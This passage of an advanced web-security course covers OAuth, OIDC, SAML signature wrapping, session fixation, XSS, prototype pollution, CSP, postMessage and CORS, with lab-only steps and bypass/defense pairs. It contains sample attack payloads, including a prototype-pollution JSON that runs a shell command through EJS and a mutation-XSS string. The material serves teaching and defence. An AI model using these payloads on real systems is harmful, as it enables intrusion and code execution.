| `exp`/`nbf` | Clock with small skew | Indefinite validity |
| `nonce` | Bound to session | Replay |

### Bypass and defense pairs
- Bypass: `jku` pointing to an attacker-hosted JWKS. Defense: allowlist JWKS URLs and pin key IDs.
- Bypass: `aud` as an array where the app only checks membership. Defense: exact single expected audience.

### Common mistakes
- Reading `alg` from the token instead of a server-side allowlist.
- Verifying signature but ignoring `exp` and `aud`.
- Treating JWTs as encrypted; they are only encoded and signed.

### Knowledge check
**Q:** Why is HS/RS confusion possible at all?
**A:** Because a public key is public; if the verifier lets the token select HMAC, that public key becomes a guessable shared secret.

===MODULE===
TITLE: OAuth 2.0 Edge Cases: Redirects, State, and PKCE
LEVEL: Advanced
MINUTES: 75
SUMMARY: Examine the three OAuth trust boundaries and how loose redirect matching, state fixation, and PKCE downgrade break them.
OBJECTIVES: Test redirect URI normalization gaps | Verify state and PKCE binding | Identify token leakage channels
TAKEAWAYS: Redirect matching must be exact | State binds consent to a browser session | PKCE must be S256 and mandatory
PRACTICE: In a local OAuth lab at <LAB_HOST>, vary redirect URIs and state values to map the authorization server's validation rules.
SOURCES: None
---
## Core idea
OAuth 2.0 delegates authority through a three-step dance: the authorization server authenticates the user, redirects back to the client with a code, and the client exchanges the code for a token. Bugs concentrate at the boundaries: consent, redirect, and exchange. Each boundary relies on a binding value that must be unforgeable and single-use. When redirect matching is loose, state is predictable or absent, or PKCE is optional, an attacker can substitute themselves into the flow.

The mental model is a chain of promises. The authorization server promises the code goes only to the registered client; `state` promises the response belongs to the same browser; PKCE promises that whoever redeems the code started the flow. Break one promise and the resulting token is attributed to the wrong party. Note that the implicit flow and fragment-based responses add leakage paths through history and `Referer`.

### Step-by-step method (lab only)
1. Map the authorize, token, revoke, and device endpoints at <LAB_HOST>.
2. Test redirect matching: exact, subdomain, suffix, path traversal (`/..`, `/%2e%2e`), and registered-client open redirects.
3. Test `state`: missing, fixed, predictable, and reflected without session binding.
4. Test PKCE: absent, `plain` versus `S256`, and swapping the verifier between requests.
5. Test code reuse and check whether tokens appear in URLs, logs, or `Referer` headers.

### Concrete example
```http
GET /oauth/authorize?client_id=lab-client&response_type=code
  &redirect_uri=https%3A%2F%2F<LAB_HOST>%2F..%2Fevil
  &state=fixed123 HTTP/1.1
Host: <LAB_HOST>
```
If the server normalizes `/..` after validation, the code is delivered to the attacker path. A fixed `state` fails to bind the flow to a browser session.

| Control | Binding | Bypass when weak |
|---|---|---|
| Redirect URI | Client identity | Code theft |
| State | Browser session | Login CSRF |
| PKCE S256 | Initiating client | Code interception |

### Bypass and defense pairs
- Bypass: suffix matching allows `https://trusted.evil.example` when `https://trusted.example` is registered. Defense: exact string comparison with no normalization.
- Bypass: `plain` PKCE reveals the verifier in the first request. Defense: require `S256` exclusively.

### Common mistakes
- Treating `state` as optional because "PKCE handles CSRF."
- Using implicit flow for single-page apps.
- Allowing wildcards in registered redirect URIs.

### Additional surface
Device authorization flows introduce a second code channel whose user code is short and phishable; polling endpoints must bind the device code to the client. Token leakage commonly occurs when access tokens travel in query strings, are logged by proxies, or are returned in fragments that scripts copy into analytics. In your lab, grep server logs for issued tokens after each flow.

### Knowledge check
**Q:** Why does a registered client's open redirect undermine OAuth even with strong state?
**A:** Because the authorization server validates the redirect URI but the client then forwards the code to an attacker-controlled destination.

===MODULE===
TITLE: OpenID Connect Validation and Identity Assertion Edge Cases
LEVEL: Advanced
MINUTES: 60
SUMMARY: Go beyond signature checking to validate issuer, audience, nonce, and contextual claims in OIDC ID tokens.
OBJECTIVES: Enumerate ID token validation requirements | Detect cross-client and replay attacks | Validate contextual claims safely
TAKEAWAYS: An ID token's meaning is contextual | Audience must match exactly | Nonce binds the token to one authentication request
PRACTICE: With a lab OIDC provider at <LAB_HOST>, replay an ID token issued to a second client and observe whether your app accepts it.
SOURCES: None
---
## Core idea
OpenID Connect adds an identity layer to OAuth: the ID token is a signed JWT whose claims assert *who* authenticated, *when*, and *for whom*. A valid signature alone is insufficient because the same signed token may be valid for a different client, at a different time, or in a different browser session. The mental model is a context-bound assertion: the token is meaningful only when issuer, audience, authorized party, nonce, and time all match the expecting relying party.

Typical validation gaps include accepting `aud` arrays with loose membership checks, ignoring `azp` when multiple audiences are present, skipping `nonce`, trusting `acr`/`amr` without policy mapping, and mis-handling `at_hash`/`c_hash`. JWKS retrieval can be poisoned through `kid` confusion, and clock skew can extend `exp`. Logout and revocation are often incomplete, leaving a valid ID token usable after sign-out.

### Step-by-step method (lab only)
1. Decode an ID token from <LAB_HOST> and list all claims with their values.
2. For each claim, determine whether the relying party validates it; use a debug endpoint to report validation results.
3. Request a token for client B and replay it against client A.
4. Replay the same token in a second browser session to test nonce binding.
5. Test expiry boundaries by shifting `exp` slightly within allowed skew in your lab signer.

### Concrete example
```json
{
  "iss": "https://<LAB_HOST>",
  "aud": ["client-a", "client-b"],
  "azp": "client-b",
  "sub": "1042",
  "nonce": "n-8f31",
  "exp": 1760000000
}
```
If client A checks only that `aud` contains `client-a`, this token issued to B is accepted. Correct logic requires exact audience match and `azp` equal to the caller's client ID.

| Claim | Required check | Weak check |
|---|---|---|
| `iss` | Exact configured URL | Suffix match |
| `aud` | Exact single value | Array membership |
| `nonce` | Cookie/session bound | Ignored |
| `exp` | With small skew | No upper bound |

### Bypass and defense pairs
- Bypass: token substitution from a second client. Defense: pin expected issuer and audience per relying party.
- Bypass: nonce reuse across sessions. Defense: store nonce server-side, single-use, tied to the auth request.

### Common mistakes
- Confusing ID tokens with access tokens; ID tokens are for the client, not for APIs.
- Trusting `acr` values without mapping them to actual assurance levels.
- Assuming identity provider compromise is out of scope; pinning JWKS limits damage.

### Knowledge check
**Q:** When `aud` contains multiple clients, why must `azp` be checked?
**A:** Because `azp` identifies which client actually requested the token; without it any listed audience can impersonate another.

===MODULE===
TITLE: XML Signature Wrapping and SAML Assertion Confusion
LEVEL: Advanced
MINUTES: 90
SUMMARY: Understand why SAML signatures can validate over one node while the application consumes another, and how to test assertion binding.
OBJECTIVES: Construct XML Signature Wrapping variants | Validate conditions and audience restrictions | Prevent assertion replay
TAKEAWAYS: Signature validation and assertion consumption must resolve the same node | Duplicate IDs are dangerous | Conditions need strict clocks
PRACTICE: In a lab IdP at <LAB_HOST>, decode a SAMLResponse and craft a harmless wrapped assertion to see which identity the service provider accepts.
SOURCES: None
---
## Core idea
SAML assertions are XML, and XML signatures reference a node by ID. XML permits structures where a validator verifies a signature over one element while the application reads a different element with the same or a confusing ID. This is XML Signature Wrapping (XSW). The mental model is two parsers: one that validates and one that consumes. If they resolve different nodes, a valid signature can authenticate an attacker-modified identity.

Common variants: inserting a second assertion with a changed `NameID` while leaving the signed original in a wrapper; moving the signed assertion into an extension element; copying the signature to a forged assertion; abbreviating with comments so canonicalization sees different text; and namespace confusion. Beyond XSW, conditions such as `AudienceRestriction`, `Recipient`, `NotBefore`, and `NotOnOrAfter` are frequently ignored, and assertions can be replayed until expiry.

### Step-by-step method (lab only)
1. Capture a SAMLResponse from your lab service provider at <LAB_HOST> and base64-decode it.
2. Identify `SignedInfo`, the `Reference` URI, and the signed `Assertion` ID.
3. Build XSW variants that keep the signed node intact but insert a forged assertion with a different `NameID`.
4. Vary `AudienceRestriction` and `Recipient` to see which conditions are enforced.
5. Replay a captured assertion after logout to test for replay protection.

### Concrete example
```xml
<Response>
  <Assertion ID="A1"> ...signed, NameID=userA... </Assertion>
  <Extension>
    <Assertion ID="A1"> ...forged, NameID=admin... </Assertion>
  </Extension>
</Response>
```
A validator that finds the first `ID="A1"` and a consumer that finds the last can disagree.

| Variant | Validator sees | Consumer sees |
|---|---|---|
| Wrapped copy | Signed original | Forged inner |
| Duplicate ID | First match | Last match |
| Comment split | Canonical text | Parsed text |

### Bypass and defense pairs
- Bypass: duplicate IDs with different `NameID`. Defense: reject documents with duplicate IDs and consume only the signed element.
- Bypass: NameID confusion using a different attribute as identity. Defense: bind identity to one explicitly configured attribute.

### Common mistakes
- Assuming "signature valid" means "identity trusted."
- Allowing large clock skew.
- Using libraries that resolve references by searching the whole document.

### Additional surface
Artifact binding changes the transport but not the trust: an artifact resolver must enforce the same conditions as a POSTed assertion. Clock skew between IdP and SP can turn an expired assertion into an accepted one, so keep synchronized time and minimal tolerance. Test replay by resubmitting the same assertion after a fresh login.

### Knowledge check
**Q:** What invariant prevents XSW?
**A:** The exact element whose signature was verified must be the same element from which identity and attributes are read, with duplicate IDs rejected.

===MODULE===
TITLE: Session Fixation and Session Donation Variants
LEVEL: Advanced
MINUTES: 60
SUMMARY: Study how a pre-authentication session identifier can survive login and become an authenticated session under attacker control.
OBJECTIVES: Identify fixation vectors beyond URL parameters | Verify session rotation on privilege change | Test invalidation on logout
TAKEAWAYS: Session IDs must be regenerated at authentication | Cookie scope enables sibling-domain fixation | Logout must invalidate server state
PRACTICE: In a local lab at <LAB_HOST>, fix an anonymous session ID via a URL parameter, authenticate, and check whether the ID rotates.
SOURCES: None
---
## Core idea
Session fixation succeeds when a session identifier chosen before authentication remains valid after it. The mental model is a binding: an anonymous session must be *rebound* to an authenticated identity at login by issuing a new identifier. If the old identifier is still accepted, anyone who knew it before login now shares the victim's authenticated session. Variants extend well beyond the classic query-string parameter.

Cookie tossing uses a sibling subdomain to set a cookie with `Domain=.lab.<LAB_HOST>` that is sent to the application. Session donation sends the victim a link containing a chosen session ID. Login CSRF forces the victim to authenticate into the attacker's account. Failure to rotate on privilege change, parallel-session retention, and incomplete logout invalidation are related defects. Cookie prefixes (`__Host-`) and `SameSite` mitigate some vectors but not rotation failures.

### Step-by-step method (lab only)
1. Obtain an anonymous session ID from <LAB_HOST> and note its cookie attributes.
2. Fix that ID into a second browser via URL parameter, cookie injection, or a sibling subdomain in your lab.
3. Authenticate the second browser and compare the session ID before and after.
4. Reuse the original ID from the first browser and check whether it grants authenticated access.
5. Test logout, password change, and privilege elevation for rotation and invalidation.

### Concrete example
```http
GET /?sid=FIXED123 HTTP/1.1
Host: <LAB_HOST>
Set-Cookie: session=FIXED123; Domain=.lab.<LAB_HOST>; Path=/
```
After the victim logs in, the attacker reuses `session=FIXED123`. A correct server responds with a completely new `Set-Cookie` on login and invalidates the old identifier server-side.

| Variant | Fixation channel | Defense |
|---|---|---|
| URL parameter | Link | Ignore URL session IDs |
| Cookie tossing | Sibling domain | `__Host-` prefix |
| Session donation | Shared link | Rotate on login |
| Login CSRF | Forced login | Anti-CSRF on login |

### Bypass and defense pairs
- Bypass: rotation that changes the cookie but leaves the old ID valid. Defense: destroy old server-side session state.
- Bypass: subdomain cookie overriding due to `Domain` scoping. Defense: use host-only cookies with `__Host-` prefix.

### Common mistakes
- Assuming `HttpOnly` prevents fixation; it does not.
- Rotating only at login, not at privilege change.
- Forgetting that session IDs in URLs leak through referrers and logs.

### Knowledge check
**Q:** Why is issuing a new cookie insufficient if the old session remains valid server-side?
**A:** Because an attacker who knows the old identifier can still present it and be mapped to the authenticated session.

===MODULE===
TITLE: Authorization Middleware Ordering and Default-Deny
LEVEL: Advanced
MINUTES: 60
SUMMARY: Learn how guard placement, fallback routes, and field-level checks create function-level authorization gaps.
OBJECTIVES: Map middleware order to enforcement points | Enumerate unguarded routes and verbs | Enforce default-deny policy
TAKEAWAYS: Authorization must be the default, not an opt-in | Alternate routes and content types are common gaps | GraphQL needs field-level checks
PRACTICE: On a local app at <LAB_HOST>, enumerate routes and test method overrides and GraphQL aliases for unguarded operations.
SOURCES: None
---
## Core idea
Function-level authorization failures often stem from *ordering* rather than missing checks. A framework may route before authenticating, a guard may cover one controller family but not a fallback, or a new endpoint may be added without an explicit policy in a default-allow system. The mental model is a chain: routing -> authentication -> authorization -> handler. A single missing link exposes the resource. The robust design is default-deny: everything is forbidden unless an explicit policy grants it.

GraphQL adds granularity. Authorizing the operation as a whole is insufficient when fields carry different sensitivity, and aliases or fragments can restructure a query so that a field-based filter misses it. Bulk endpoints are another gap: the request may be authorized once while individual items are not. Alternate content types, method overrides, and internally routed paths can bypass a URL-based guard.

### Step-by-step method (lab only)
1. Map middleware order at <LAB_HOST> using a debug route that logs which guards ran.
2. Enumerate routes including static paths, API prefixes, and framework-generated endpoints.
3. Test each with different verbs and `X-HTTP-Method-Override` headers.
4. In GraphQL, test restricted fields through aliases, fragments, and variables.
5. Request an intentionally nonexistent route to check whether the fallback denies by default.

### Concrete example
```http
POST /graphql HTTP/1.1
Host: <LAB_HOST>
Authorization: Bearer <TOKEN_B>
Content-Type: application/json

{"query":"{ user(id:\"A\"){ email internalNotes } }"}
```
If only the top-level `user` field is authorized, `internalNotes` leaks. A method-override probe:
```http
POST /api/invoices/1042 HTTP/1.1
Host: <LAB_HOST>
X-HTTP-Method-Override: DELETE
```

| Guard placement | Gap |
|---|---|
| Route-level only | New routes unprotected |
| Method-based | Override headers |
| Query-level only | Sensitive nested fields |

### Bypass and defense pairs
- Bypass: alias renaming a restricted field. Defense: authorize by field definition, not response key.
- Bypass: fallback route that renders any template by name. Defense: default-deny and explicit allowlists.

### Common mistakes
- Testing only documented endpoints.
- Assuming a 401 implies authorization was checked.
- Relying on front-end hiding to enforce function-level policy.

### Additional surface
Bulk operations deserve special scrutiny: a single authorized request may return or mutate hundreds of objects whose individual permissions were never checked. Alternate content types such as form-encoded versus JSON can select different code paths with different guards. Enumerate both in your local test matrix.

### Knowledge check
**Q:** Why is default-deny more robust than enumerating protected routes?
**A:** Because new endpoints are safe by construction; an forgotten route fails closed instead of open.

===MODULE===
TITLE: DOM XSS Sink Taxonomy and Taint Tracking
LEVEL: Advanced
MINUTES: 60
SUMMARY: Build a source-to-sink mental model for DOM XSS across classic, jQuery, and framework-specific sinks.
OBJECTIVES: Classify sources and sinks by context | Trace taint through string operations | Choose context-correct sanitizers
TAKEAWAYS: DOM XSS is a dataflow problem | Each sink has a required context | Framework escape hatches are sinks too
PRACTICE: On a local page at <LAB_HOST>, use DevTools breakpoints on candidate sinks and confirm a harmless marker reaches execution.
SOURCES: None
---
## Core idea
DOM XSS is a taint-flow problem: untrusted data from a source reaches a dangerous sink without context-appropriate neutralization. Sources include `location`, `document.referrer`, `postMessage`, storage, and WebSocket messages. Sinks include `eval`, `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`, `location` assignments, `jQuery.html()`, `dangerouslySetInnerHTML`, and Angular's `bypassSecurityTrustHtml`. The crucial refinement is context: HTML text, quoted attribute, URL, and JavaScript each require different defenses.

The mental model is a graph. Nodes are values; edges are assignments, concatenations, and templating. A value is tainted if any path from a source reaches it un-sanitized. String operations such as `replace`, `split`, and template literals do not remove taint. Because the browser executes the final string, the sink determines which interpretation applies. Encoding for the wrong context is a common failure.

### Step-by-step method (lab only)
1. Search the client source at <LAB_HOST> for sink patterns and set DevTools breakpoints on them.
2. For each sink, walk backward to its sources using the call stack and variable tracing.
3. Inject a unique marker and observe where it lands in the DOM.
4. Classify the context and test only the characters relevant to that context.
5. Verify with a harmless execution marker, then confirm the fix with the same payload.

### Concrete example
```js
const id = new URLSearchParams(location.search).get('id');
document.getElementById('out').innerHTML = '<b>' + id + '</b>';
```
Here the sink is `innerHTML` in an HTML context; encode `<`, `>`, and `&`, or better use `textContent`:
```js
document.getElementById('out').textContent = id;
```

| Sink | Context | Safer alternative |
|---|---|---|
| `innerHTML` | HTML | `textContent` |
| `location` | URL | Allowlist scheme |
| `eval` | JavaScript | Avoid entirely |
| `jQuery.html()` | HTML | `.text()` |

### Bypass and defense pairs
- Bypass: double encoding that a single decode pass misses. Defense: decode once, validate, then encode for the destination context.
- Bypass: `javascript:` URL in a location sink. Defense: allowlist `http`/`https` schemes.

### Common mistakes
- Applying HTML entity encoding to a URL sink.
- Trusting sanitizers that only strip tags; attributes and URLs still execute.
- Ignoring third-party scripts that introduce their own sinks.

### Additional surface
Remember that taint can enter from storage and postMessage, not only the URL. A value written to localStorage by one script may later be read and inserted into the DOM of another page on the same origin. Trace backward through every read, including event handlers and third-party widgets.

### Knowledge check
**Q:** Why does `textContent` eliminate this class of bug for text insertion?
**A:** Because it creates a text node; the browser never parses the value as markup, so no markup context exists.

===MODULE===
TITLE: Mutation XSS: Parser Round-Trip Instability
LEVEL: Advanced
MINUTES: 60
SUMMARY: Study how sanitized markup can become executable after serialization and re-parsing in a different namespace context.
OBJECTIVES: Explain mutation XSS mechanics | Craft namespace-confusion probes | Verify sanitizer round-trip safety
TAKEAWAYS: Serialization is not identity | SVG and MathML change parsing rules | Sanitizers must account for the destination context
PRACTICE: In a lab at <LAB_HOST> with an innerHTML-based sanitizer, feed a harmless mutation payload and compare the DOM before and after a serialize/parse round trip.
SOURCES: None
---
## Core idea
Mutation XSS (mXSS) occurs when markup is parsed into a DOM, sanitized or serialized, and then parsed again into a *different* tree that contains executable content. The mental model is parser round-trip instability: `parse(s) -> DOM -> serialize -> s'` where `s'` does not reproduce the original tree. Namespaces are the main engine of mutation: inside `<svg>` or `<math>`, element and attribute rules differ, and transitioning out of them can place text into unexpected contexts. `noscript`, `style`, `template`, and comments add further quirks because their content is parsed with scripting-state-dependent rules.

A sanitizer may see a harmless tree, serialize it, and the browser then reparse the string with the scripting flag enabled, turning inert text into tags. DOMPurify and browser parsers have both seen such bugs historically, so the lesson is to test the exact serialization path your application uses rather than trusting a library name.

### Step-by-step method (lab only)
1. Locate a flow at <LAB_HOST> that assigns sanitized content to `innerHTML` and later reads or reuses it.
2. Craft payloads combining `<svg>`, `<math>`, `<noscript>`, `<style>`, and comments with a harmless marker.
3. Compare `element.innerHTML` before and after a forced round trip in DevTools.
4. Test in more than one browser engine, since scripting-state handling differs.
5. Confirm execution with an innocuous marker, then verify the patched sanitizer blocks it.

### Concrete example
```html
<noscript><p title="</noscript><img src=x data-mark=1>">
```
With scripting enabled, the browser's reparse can close `noscript` inside the attribute and surface an `<img>` element. A marker attribute (`data-mark`) lets you verify the mutation without real harm.

| Mechanism | Why it mutates |
|---|---|
| SVG/MathML namespace | Different tag and attribute parsing |
| noscript | Scripting flag changes content model |
| Comments | Serialization can split text |
| style raw text | Energy until closing tag differs |

### Bypass and defense pairs
- Bypass: sanitize once, then reassign the serialized string to `innerHTML`. Defense: sanitize at the final sink and avoid re-parsing.
- Bypass: namespace transition that hides a tag from the sanitizer. Defense: configure the sanitizer for the destination namespace and disallow SVG/MathML when unnecessary.

### Common mistakes
- Testing `document.write` behavior when the app uses `innerHTML`.
- Assuming one browser's behavior generalizes.
- Using blacklist tag stripping instead of a vetted sanitizer.

### Knowledge check
**Q:** Why can a sanitized string become dangerous after serialization?
**A:** Because the serializer emits a string whose reparse tree differs from the sanitized tree, potentially exposing executable elements.

===MODULE===
TITLE: Prototype Pollution to RCE in Node Applications
LEVEL: Advanced
MINUTES: 90
SUMMARY: Trace prototype pollution from unsafe merge operations through Node gadgets to command execution in server-side templates.
OBJECTIVES: Find pollution sources in merges and query parsers | Identify exploitable gadgets | Build a defense-in-depth fix
TAKEAWAYS: Pollution is a write to a shared prototype | Gadgets turn properties into execution | Filtering one key path is insufficient
PRACTICE: In a local Node app at <LAB_HOST>, send a harmless `__proto__` payload and observe a debug route dumping `Object.prototype`.
SOURCES: None
---
## Core idea
Prototype pollution occurs when attacker-controlled keys write to `__proto__` or `constructor.prototype` during a recursive merge, clone, or path assignment. The result is a property on a shared prototype inherited by many objects. Alone that is often noisy; impact comes from *gadgets*: code paths that read a configurable property from an object and use it dangerously. In Node, classic gadgets live in template engines and child-process helpers, where a polluted property becomes a template string or execution option.

The mental model is a two-stage chain. Stage one is a write primitive into `Object.prototype`. Stage two is a read of that property in a sensitive context, such as EJS's `outputFunctionName`, a view engine option, or a command option. Security teams often fix stage one by blocking the literal `__proto__` key, but `constructor.prototype` and nested variants bypass such filters.

### Step-by-step method (lab only)
1. Find merge/clone/query-parsing code in the app at <LAB_HOST>.
2. Submit JSON containing `__proto__` and `constructor.prototype` keys with a harmless marker value.
3. Use a debug route to inspect `Object.prototype` and confirm pollution.
4. Enumerate gadgets: render options, template engine settings, path options, and child-process options.
5. Chain the polluted property into a gadget and verify with an innocuous marker command.

### Concrete example
```js
function merge(target, src) {
  for (const k in src) {
    if (typeof src[k] === 'object') merge(target[k], src[k]);
    else target[k] = src[k];
  }
}
```
Sending the following can pollute a template option:
```json
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');//"}}
```
When EJS compiles a template, the polluted option is interpolated into generated code.

| Gadget | Polluted property | Effect |
|---|---|---|
| EJS | `outputFunctionName` | Code injection |
| View options | `root`/`filename` | Path control |
| lodash template | `sourceURL` | Source injection |

### Bypass and defense pairs
- Bypass: block only `__proto__`, attacker uses `constructor.prototype`. Defense: reject both and use `Object.create(null)` for dictionaries.
- Bypass: pollution via array index keys. Defense: validate key names against an allowlist and freeze critical prototypes.

### Common mistakes
- Treating pollution as "just a DoS" without hunting gadgets.
- Patching a single library instead of fixing the merge utility.
- Forgetting that client-side pollution affects DOM sinks too.

### Additional surface
Prototype pollution is not server-only: client-side merge utilities can pollute Object.prototype and then change DOM behavior or sanitizer configuration. Use a JSON reviver that rejects dangerous keys, and keep critical configuration in Object.create(null) maps so inherited properties cannot influence decisions.

### Knowledge check
**Q:** Why is freezing `Object.prototype` a useful defense-in-depth measure?
**A:** Because it makes the shared prototype immutable, so even a missed pollution source cannot install gadget properties.

===MODULE===
TITLE: Content Security Policy Bypass Techniques
LEVEL: Advanced
MINUTES: 60
SUMMARY: Learn to read CSP as a trust policy and find permitted sources that can host or reflect attacker-controlled script.
OBJECTIVES: Parse CSP directives and identify weak sources | Exploit nonce and base-uri weaknesses | Design a strict CSP
TAKEAWAYS: CSP bypasses exploit trust exceptions | Nonces must be unpredictable and single-use | strict-dynamic shifts trust to loaders
PRACTICE: Against a local page at <LAB_HOST>, inspect response headers and test whether a static nonce permits injection of a harmless script.
SOURCES: None
---
## Core idea
A Content Security Policy is a whitelist of origins and execution rules for scripts and other resources. Bypasses rarely "break" the parser; they exploit exceptions the policy intentionally allows. The mental model is to ask: which permitted source can I make serve my code, or which directive can I weaken by injecting markup? Common levers are predictable or reused nonces, `strict-dynamic` trusting a loader that can be manipulated, JSONP or file-upload endpoints on allowed origins, missing `base-uri`, plugin-capable `object-src`, and header injection that adds a second policy.

Reading a policy correctly matters: multiple `script-src` values are treated as one, and `default-src` is only a fallback. A policy with `'unsafe-inline'` plus a nonce is effectively inline-allowed in older browsers that ignore nonces.

### Step-by-step method (lab only)
1. Fetch response headers from <LAB_HOST> and parse each directive.
2. Check nonce entropy, reuse across responses, and whether the nonce is reflected into HTML.
3. Look for JSONP, template, or upload endpoints on allowed origins that reflect attacker text.
4. Test missing `base-uri` by injecting a `<base>` tag to redirect relative script URLs.
5. Test dangling markup to extract a nonce from a later script tag.

### Concrete example
```http
Content-Security-Policy: default-src 'self'; script-src 'nonce-abc123' 'strict-dynamic'; object-src 'none'
```
A static nonce permits:
```html
<script nonce="abc123">/* harmless marker */</script>
```
With `strict-dynamic`, any script loaded by a trusted loader becomes trusted, so an allowed JSONP endpoint becomes a script-hosting primitive.

| Directive | Weakness | Bypass |
|---|---|---|
| `script-src` | Nonce reuse | Injected script with nonce |
| `base-uri` | Missing | Relative script redirect |
| `object-src` | Permissive | Plugin execution |
| `frame-ancestors` | Absent | Clickjacking |

### Bypass and defense pairs
- Bypass: JSONP callback reflection on an allowed origin. Defense: remove JSONP and allowlist exact script URLs.
- Bypass: dangling markup steals a nonce. Defense: generate a fresh cryptographically random nonce per response and never reflect it before the script.

### Common mistakes
- Relying on `unsafe-inline` together with nonces.
- Forgetting `base-uri` and `object-src`.
- Assuming CSP replaces output encoding; it is defense in depth.

### Additional surface
Remember that CSP is layered defense: frame-ancestors replaces X-Frame-Options, and Trusted Types can eliminate DOM sinks by requiring typed values. A policy without object-src none or with permissive frame-src leaves non-script execution paths open even when script-src is tight.

### Knowledge check
**Q:** Why does nonce reuse across responses defeat nonce-based CSP?
**A:** Because a nonce observed in one response can be attached to injected script in another response that uses the same value.
===MODULE===
TITLE: postMessage Trust Boundaries and Frame Identity
LEVEL: Advanced
MINUTES: 60
SUMMARY: Analyze cross-origin messaging as two trust decisions: who may send to you and who may receive your secrets.
OBJECTIVES: Audit message listeners for origin validation | Exploit weak matching and frame identity checks | Restrict targetOrigin on sends
TAKEAWAYS: Check event.origin exactly, never by substring | event.source alone is not identity | Never broadcast secrets with a wildcard target
PRACTICE: On a local page at <LAB_HOST>, add a harmless message listener with weak origin matching and deliver a payload from a second owned origin.
SOURCES: None
---
## Core idea
The `postMessage` API lets frames communicate across origins, which means it deliberately crosses a security boundary. Two decisions matter: which senders a listener trusts, and which receivers a sender trusts. A listener that validates `event.origin` with `includes`, `startsWith`, or a regex is vulnerable to lookalike origins such as `https://trusted.example.attacker.tld`. A sender that uses `targetOrigin: "*"` broadcasts any payload, including tokens, to whatever frame currently occupies the window reference.

The mental model is an inbox with a return address. The origin is the verified return address; the source window is merely the envelope, which can be reused by navigation. Checking only `event.source` is unsafe because an attacker can navigate that frame to their own content. Frame-counting races  -  where a listener trusts whichever index in `window.frames` it expects  -  are another variant. Data validation is a third layer: even from a trusted origin, the message shape must be validated before reaching a sink such as `innerHTML` or a navigation.

### Step-by-step method (lab only)
1. Search source at <LAB_HOST> for `addEventListener('message')` and `postMessage(` calls.
2. For each listener, record the origin check: exact equality, regex, substring, or absent.
3. Check whether `event.source` is validated against an expected window and whether navigation is possible.
4. From an owned second origin, deliver crafted messages with a harmless marker and observe the handler's behavior.
5. Inspect outbound posts for wildcard `targetOrigin` and verify whether sensitive data is included.

### Concrete example
```js
window.addEventListener('message', (e) => {
  if (e.origin.includes('https://trusted.example')) {
    document.getElementById('view').innerHTML = e.data.html;
  }
});
```
An attacker origin `https://trusted.example.attacker.test` passes `includes`, and the `html` field reaches an HTML sink. The fix requires `e.origin === 'https://trusted.example'` plus schema validation of `e.data`.

| Check | Strength | Failure |
|---|---|---|
| Exact origin string | Strong | None |
| Regex or substring | Weak | Lookalike domains |
| Source window only | Weak | Frame navigation |
| Wildcard target | None | Secret disclosure |

### Bypass and defense pairs
- Bypass: navigate the trusted frame to attacker content so `event.source` still matches. Defense: validate both origin and an unguessable channel identifier.
- Bypass: send a message with an unexpected shape that triggers a sink. Defense: validate types and allowlist fields.

### Common mistakes
- Comparing origin case-insensitively or ignoring the port.
- Trusting `event.origin` from sandbox frames with `null` origin.
- Forgetting that message handlers can be registered by libraries.

### Knowledge check
**Q:** Why is `event.source` not a reliable identity check?
**A:** Because a window reference can be navigated to a different origin; the source object stays the same while the content and trust change.

===MODULE===
TITLE: CORS and Credential Edge Cases
LEVEL: Advanced
MINUTES: 60
SUMMARY: Study how reflective origin policies, null origins, and cache interactions turn CORS into authenticated data disclosure.
OBJECTIVES: Test origin matching rules and credential combinations | Exploit null origin and suffix trust | Verify Vary and cache behavior
TAKEAWAYS: CORS headers are a permission grant from the server | Reflecting Origin disables same-origin protection | Credentials require explicit origin allowlisting
PRACTICE: Against a local API at <LAB_HOST>, vary the Origin header and inspect Access-Control-Allow-Origin and Allow-Credentials responses.
SOURCES: None
---
## Core idea
CORS is a browser-enforced boundary, but the permission statement comes from the server. If a server reflects the request's `Origin` into `Access-Control-Allow-Origin`, the browser treats attacker JavaScript as same-origin for that response. Edge cases include trusting the `null` origin used by sandboxed iframes and data URLs, suffix or regex origin matching, and missing `Vary: Origin` that lets a shared cache serve a response authorized for one origin to another.

The mental model is a server-signed pass. The browser will hand authenticated response data to any origin the server lists. Sensible defaults are an explicit origin allowlist, no wildcard when credentials are allowed, and `Vary: Origin` whenever the header varies. Preflight requests are another surface:permissive method or header allowances can enable state-changing cross-origin requests with credentials.

### Step-by-step method (lab only)
1. Send requests to <LAB_HOST> with `Origin` values: an allowed origin, a lookalike, a subdomain, `null`, and an arbitrary domain.
2. Record `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, and `Vary`.
3. Test whether `null` is accepted via a sandboxed iframe or data URL in your lab.
4. Test preflight with `Access-Control-Request-Method: PUT` and custom headers.
5. Check whether a response authorized for one origin is cached and served to another.

### Concrete example
```http
GET /api/me HTTP/1.1
Host: <LAB_HOST>
Origin: https://evil.example
Authorization: Bearer <TOKEN_A>

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true
```
The combination of reflective ACAO and credentials means any origin can read authenticated user data.

| Pattern | Risk |
|---|---|
| `ACAO: *` with credentials | Invalid or exploitable depending on client |
| Reflected Origin | Any origin reads data |
| `null` trusted | Sandbox pages read data |
| Missing `Vary: Origin` | Cross-origin cache mixing |

### Bypass and defense pairs
- Bypass: suffix matching that accepts `https://trusted.example.attacker.test`. Defense: exact string comparison against a static allowlist.
- Bypass: `null` origin from a sandbox. Defense: never include `null` in allowed origins.

### Common mistakes
- Using regex origin matching without anchoring.
- Assuming CORS protects against server-to-server requests; it only governs browsers.
- Ignoring JSONP fallbacks that bypass CORS entirely.

### Additional surface
Credentialed requests with custom headers always trigger a preflight, so an overly permissive preflight policy is as dangerous as a reflective ACAO. Also examine subresource requests: a permissive policy on an API that returns tokens can be exploited from a page that the user visits, even if the main application lives on a different origin.

### Knowledge check
**Q:** Why must `Vary: Origin` be set when ACAO is dynamic?
**A:** Otherwise a cache may store the response authorized for one origin and serve it to a different origin, leaking data.

===MODULE===
TITLE: CSS Injection and UI Redress Attacks
LEVEL: Advanced
MINUTES: 60
SUMMARY: Learn how attacker-controlled CSS queries the DOM and leaks secrets, and how overlays coerce unintended user interactions.
OBJECTIVES: Use attribute selectors to leak tokens | Build a safe clickjacking proof of concept | Apply frame and style defenses
TAKEAWAYS: CSS can test DOM state and trigger network requests | Overlays can hijack clicks without breaking visuals | frame-ancestors is the real defense
